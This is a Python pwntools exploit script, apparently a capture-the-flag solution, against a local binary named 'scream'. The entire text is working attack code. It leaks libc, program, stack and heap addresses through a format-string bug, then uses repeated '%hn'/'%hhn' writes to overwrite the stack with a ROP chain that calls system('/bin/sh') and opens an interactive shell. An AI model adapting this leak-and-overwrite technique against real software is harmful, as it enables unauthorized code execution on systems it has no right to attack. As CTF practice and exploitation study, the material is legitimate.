from pwn import *

context.log_level = 'debug'
r = process("./scream")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf  = ELF("./scream")

r.sendlineafter(b"> ", b'%15$p,%9$p,%8$p,%6$p,')
libc_base = int(r.recvuntil(b',').decode()[:-1], 16) - 0x29d90
elf.address = int(r.recvuntil(b',').decode()[:-1], 16) - 0x12f7
stack_addr = int(r.recvuntil(b',').decode()[:-1], 16)
heap_addr = int(r.recvuntil(b',').decode()[:-1], 16)
print(f"libc addr: {hex(libc_base)}\nelf addr: {hex(elf.address)}")
print(f"stack addr: {hex(stack_addr)}\nheap addr: {hex(heap_addr)}")

# gdb.attach(r, "b *fun+0x11e5-0x1199\nb *fun+0x1222-0x1199\nb *fun+0x125f-0x1199")

r.sendlineafter(b"> ", f"%{(stack_addr-0x28)&0xffff}c%10$hn".encode())
r.sendlineafter(b"> ", f"%{(elf.sym['main']+0x4b)&0xff}c%49$hhn".encode())

def write_bytes(addr, value):
    for i in range(8):
        bt = (value>>(i*8))&0xff
        if bt == 0: continue
        r.sendlineafter(b"> ", f"%{(elf.sym['main']+0x4b)&0xff}c%49$hhn".encode())
        r.sendlineafter(b"> ", f"%{(addr&0xffff)+i}c%36$hn".encode())
        r.sendlineafter(b"> ", f"%{bt}c%51$hhn".encode())
        print(f"written byte: {hex(bt)} to address {hex(addr+i)}")

pop_rdi = libc_base + 0x2a3e5
ret_addr = libc_base + 0x29139
sh_addr = libc_base+next(libc.search(b'/bin/sh'))
sys_addr = libc_base+libc.symbols['system']

write_bytes(stack_addr+0x8, pop_rdi)
write_bytes(stack_addr+0x10, sh_addr)
write_bytes(stack_addr+0x18, ret_addr)
write_bytes(stack_addr+0x20, sys_addr)

print(f"shell addr: {hex(sh_addr)}")
print(f"system addr: {hex(sys_addr)}")

r.sendlineafter(b"> ", b"")
r.sendlineafter(b"> ", b"")
r.sendlineafter(b"> ", b"")

r.interactive()
